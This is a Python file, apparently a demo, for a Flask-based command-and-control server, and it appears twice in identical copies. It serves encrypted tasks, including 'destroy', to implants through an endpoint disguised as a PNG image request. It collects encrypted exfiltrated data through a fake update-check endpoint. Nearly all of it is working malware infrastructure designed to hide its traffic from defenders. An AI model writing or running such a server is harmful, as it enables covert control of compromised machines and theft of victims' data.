# c2_server.py
# Flask-based server acting as the C2 server.
# Provides two endpoints with disguised names:
# - /images/logo.png: returns encrypted task instructions for implant
# - /updates/check: receives encrypted exfiltrated data from implant
# Uses a dictionary to maintain a task queue for implant(s)

from flask import Flask, request, jsonify
import base64
import datetime
from crypto_utils import encrypt_message, decrypt_message

app = Flask(__name__)

# Task queue so each implant is assigned a list of tasks
# Demo specific - initialize implant_001 with sample tasks to display functionality
task_queue = {
    "implant_001": ["whoami", "status", "destroy", "contingency"]
}

# Disguised endpoint mimics a harmless static image request
@app.route('/images/logo.png', methods=['GET'])
def get_task():
    #get implant identifier from query parameters
    implant_id = request.args.get("id")
    tasks = task_queue.get(implant_id, [])
    if tasks:
        # Pop next task from the queue
        task = tasks.pop(0)
        # Encrypt task using AES util function
        encrypted_task = encrypt_message(task)
        # Create a response to mimic an image
        response = app.response_class(encrypted_task, mimetype='image/png')
        # Headers to disguise response
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Cache-Control"] = "public, max-age=86400"
        return response
    # Return a 204 if no tasks remain
    return "", 204

# Disguised endpoint to mimic benign update check
@app.route('/updates/check', methods=['POST'])
def receive_data():
    # Get JSON data containing implant's ID and encrypted data
    data = request.json
    print(f"[{datetime.datetime.now()}] Exfil from {data['id']}:")
    # Decrypt exfiltrated data with AES util
    decrypted = decrypt_message(data['data'])
    print(decrypted)
    return "OK", 200

if __name__ == '__main__':
    # Run server on all interfaces at port 5000 to test local
    app.run(host='0.0.0.0', port=5000)


# c2_server.py
# Flask-based server acting as the C2 server.
# Provides two endpoints with disguised names:
# - /images/logo.png: returns encrypted task instructions for implant
# - /updates/check: receives encrypted exfiltrated data from implant
# Uses a dictionary to maintain a task queue for implant(s)

from flask import Flask, request, jsonify
import base64
import datetime
from crypto_utils import encrypt_message, decrypt_message

app = Flask(__name__)

# Task queue so each implant is assigned a list of tasks
# Demo specific - initialize implant_001 with sample tasks to display functionality
task_queue = {
    "implant_001": ["whoami", "status", "destroy", "contingency"]
}

# Disguised endpoint mimics a harmless static image request
@app.route('/images/logo.png', methods=['GET'])
def get_task():
    #get implant identifier from query parameters
    implant_id = request.args.get("id")
    tasks = task_queue.get(implant_id, [])
    if tasks:
        # Pop next task from the queue
        task = tasks.pop(0)
        # Encrypt task using AES util function
        encrypted_task = encrypt_message(task)
        # Create a response to mimic an image
        response = app.response_class(encrypted_task, mimetype='image/png')
        # Headers to disguise response
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Cache-Control"] = "public, max-age=86400"
        return response
    # Return a 204 if no tasks remain
    return "", 204

# Disguised endpoint to mimic benign update check
@app.route('/updates/check', methods=['POST'])
def receive_data():
    # Get JSON data containing implant's ID and encrypted data
    data = request.json
    print(f"[{datetime.datetime.now()}] Exfil from {data['id']}:")
    # Decrypt exfiltrated data with AES util
    decrypted = decrypt_message(data['data'])
    print(decrypted)
    return "OK", 200

if __name__ == '__main__':
    # Run server on all interfaces at port 5000 to test local
    app.run(host='0.0.0.0', port=5000)

